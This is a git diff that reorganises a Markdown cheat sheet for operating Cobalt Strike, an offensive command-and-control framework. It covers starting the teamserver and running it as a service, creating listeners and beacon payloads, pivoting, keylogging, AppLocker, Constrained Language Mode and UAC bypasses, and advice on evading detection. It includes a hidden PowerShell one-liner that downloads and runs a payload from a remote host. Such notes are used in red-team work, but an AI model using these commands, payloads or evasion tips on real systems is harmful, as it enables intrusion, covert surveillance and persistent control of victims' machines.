@@ -1,57 +1,20 @@
 # Cobalt-Strike cheatsheet.
 # General
-#### Start teamserver
+
+#### Change sleep / Set interactive
+- OPSEC Lower sleep = More traffic/Noice = More likely to get caught.
 ```
-cd /opt/cobaltstrike
-sudo ./teamserver <IP> <PASSWORD> <C2 PROFILE>
-
-sudo ./teamserver <IP> <PASSWORD> c2-profiles/normal/webbug.profile
-```
-
-### Create a listener
-- Two type of listeners: `egress` (HTTP(S) and DNS) and `peer-to-peer` (SMB or TCP).
-  - `egress` listens on the teamserver IP.
-  - `peer-to-peer` listens on a existing beacon.  	
-1. In the menu click the HeadPhones Icon or click Cobalt Strike --> Listeners 
-2. Click the Add button at the bottom and and a new listener dialogue will appear.
-3. Choose a descriptive name such as ```<protocol>-<port>``` example: ```http-80```.
-4. Set the variables/settings and click Save.
-- Creating a TCP local listener is usefull for privescing or spawning new shells
-
-#### OPSEC listeners
-- DNS: Since 0.0.0.0 is the default response (and also rather nonsensical), Cobalt Strike team servers can be fingerprinted in this way.  This can be changed in the Malleable C2 profile.
-- SMB: The default pipe name(`msagent_XX`) is quite well signatured. A good strategy is to emulate names known to be used by common applications or Windows itself.  Use `PS C:\> ls \\.\pipe\` to list all currently listening pipes for inspiration.  
-
-### Create a payload
-- Attacks --> Packages --> Windows Executable (S).
-
-#### OPSEC payloads
-- Staged payloads are good if your delivery method limits the amount of data you can send. However, they tend to have more indicators compared to stageless. Given the choice, go stageless.
-- The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.
-
-#### Create dll payload
-- Bypasses default applocker configuration
-```
-C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
-link <COMPUTERNAME>
+sleep <SECONDS>
+sleep 0
 ```
 
-#### Create peer-to-peer listener
-- Creating P2P listeners can be done in the Listeners menu, by selecting the TCP or SMB Beacon payload type.
-- Then create payload for the new listener!
-
-#### Connect to beacon
-- Works like a bind shell. Most used are SMB or TCP.
-- Run the payload on the target
-- Connect to the beacon with ```link``` for smb and ```connect``` for tcp.
+#### Get metadata from beacon
 ```
-connect <IP> <PORT>
-link <IP>
+checkin
 ```
 
-#### Create pivot listener
-- To start a Pivot Listener on an existing Beacon, right-click it and select Pivoting --> Listener.
-- Might need to open port on the firewall
+#### Kill a beacon
+- Right click beacon, then Session --> Exit, then Session --> Eemove
 
 #### Upload and download files
 ```
@@ -71,30 +34,97 @@ screenwatch               Take periodic screenshots of desktop
 keylogger
 ```
 
-#### Execute assembly in memory
+## Teamserver
+#### Start teamserver
 ```
-execute-assembly <PATH TO EXE> -group=system
+cd /opt/cobaltstrike
+sudo ./teamserver <IP> <PASSWORD> <C2 PROFILE>
+
+sudo ./teamserver <IP> <PASSWORD> c2-profiles/normal/webbug.profile
 ```
 
-#### Load PowerShell script
+### Teamserver service
+#### Create service
 ```
-powershell-import <FILE>
+sudo vim /etc/systemd/system/csteamserver.service
+
+[Unit]
+Description=Cobalt Strike Team Server
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+WorkingDirectory=/home/attacker/cobaltstrike
+ExecStart=/home/attacker/cobaltstrike/teamserver <IP> <PASSWORD> <C2 PROFILE>
+
+[Install]
+WantedBy=multi-user.target
 ```
 
-#### Execute cmd command
+#### Reload service
 ```
-run <COMMAND>
-```
-
-#### Execute powershell command
-```
-powershell <COMMAND>
+sudo systemctl daemon-reload
+sudo systemctl status csteamserver.service
 ```
 
-#### Execute powershell command through powerpick
-- Bypasses Constrained Language Mode
+#### Start service
 ```
-powerpick $ExecutionContext.SessionState.LanguageMode
+sudo systemctl start csteamserver.service
+sudo systemctl status csteamserver.service
+```
+
+#### Enable service
+```
+sudo systemctl enable teamserver.service
+```
+
+## Listeners
+### Create a listener
+- Two type of listeners: `egress` (HTTP(S) and DNS) and `peer-to-peer` (SMB or TCP).
+  - `egress` listens on the teamserver IP.
+  - `peer-to-peer` listens on a existing beacon.  	
+1. In the menu click the HeadPhones Icon or click Cobalt Strike --> Listeners 
+2. Click the Add button at the bottom and and a new listener dialogue will appear.
+3. Choose a descriptive name such as ```<protocol>-<port>``` example: ```http-80```.
+4. Set the variables/settings and click Save.
+- Creating a TCP local listener is usefull for privescing or spawning new shells
+
+#### Create peer-to-peer listener
+- Creating P2P listeners can be done in the Listeners menu, by selecting the TCP or SMB Beacon payload type.
+- Then create payload for the new listener!
+
+### Create pivot listener
+- To start a Pivot Listener on an existing Beacon, right-click Pivoting --> Listener.
+- Might need to open port on the firewall
+
+#### Connect to pivot listener
+- Works like a bind shell. Most used are SMB or TCP.
+- Run the payload on the target
+- Connect to the beacon with ```link``` for smb and ```connect``` for tcp.
+```
+connect <IP> <PORT>
+link <IP>
+```
+#### OPSEC listeners
+- DNS: Since 0.0.0.0 is the default response (and also rather nonsensical), Cobalt Strike team servers can be fingerprinted in this way.  This can be changed in the Malleable C2 profile.
+- SMB: The default pipe name(`msagent_XX`) is quite well signatured. A good strategy is to emulate names known to be used by common applications or Windows itself.  Use `ls \\.\pipe\` to list all currently listening pipes for inspiration.  
+
+## Payloads
+#### Create payloads
+- Click Payloads --> Select an option or all
+
+#### Powershell payload
+- Click Attacks --> Scripted web delivery (S) --> Choose a URI path, listener and select type PowerShell IEX
+
+#### Create dll payload
+- Bypasses default applocker configuration
+```
+C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
+link <COMPUTERNAME>
 ```
 
 #### Create service binary
@@ -102,11 +132,11 @@ powerpick $ExecutionContext.SessionState.LanguageMode
 - Attacks --> Packages --> Windows Executable (S) and selecting the Service Binary output type.
 - TIP:  I recommend the use of TCP beacons bound to localhost only with privilege escalations
 
-#### Connect to beacon
-```
-connect <IP> <PORT>
-```
+#### OPSEC payloads
+- Staged payloads are good if your delivery method limits the amount of data you can send. However, they tend to have more indicators compared to stageless. Given the choice, go stageless.
+- The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.
 
+## UAC Bypass
 #### UAC bypass method 1
 ```
 elevate uac-token-duplication <LISTENER>
@@ -117,12 +147,33 @@ elevate uac-token-duplication <LISTENER>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 connect localhost 4444
 ```
-
 - Not all UAC bypasses are created equal, can elevate to system with:
 
-#### Elevate to system
+## Command Execution
+#### Execute cmd command
 ```
-elevate svc-exe
+run <COMMAND>
+```
+
+#### Execute PowerShell command
+```
+powershell <COMMAND>
+```
+
+#### Execute PowerShell command through powerpick
+- Bypasses Constrained Language Mode
+```
+powerpick $ExecutionContext.SessionState.LanguageMode
+```
+
+#### Execute assembly in memory
+```
+execute-assembly <PATH TO EXE> -group=system
+```
+
+#### Load PowerShell script
+```
+powershell-import <FILE>
 ```
 
 ## Lateral movement
